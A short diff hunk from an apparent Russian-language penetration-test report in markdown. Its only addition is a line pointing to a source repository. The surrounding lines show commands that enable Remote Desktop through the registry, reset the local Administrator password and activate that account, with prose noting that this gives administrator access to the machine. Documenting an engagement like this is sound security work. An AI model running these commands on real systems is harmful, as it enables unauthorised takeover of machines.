@@ -156,6 +156,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 net user Администратор 1357986Ui!
 net user Администратор /active:yes
 ```
+(Исходник лежит в https://github.com/B-nD/report)
 Включаем RDP, меняем пароль локального администратора и активируем его. Подключаемся по RDP и готово --- у нас администраторский доступ на машину.
 
 ## 10.x.4.(8,10), 10.x.239.(5,6), 10.x.240.14
